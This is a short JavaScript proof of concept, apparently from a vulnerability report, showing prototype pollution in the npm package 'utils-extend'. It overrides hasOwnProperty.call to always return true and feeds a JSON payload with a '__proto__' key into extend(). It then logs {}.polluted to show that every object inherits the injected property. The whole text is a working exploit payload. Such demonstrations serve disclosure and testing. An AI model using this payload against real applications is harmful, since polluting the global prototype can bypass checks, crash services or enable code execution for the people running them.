Object.prototype.hasOwnProperty.call = () => true;
const {extend} = require('utils-extend');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject);
console.log({}.polluted);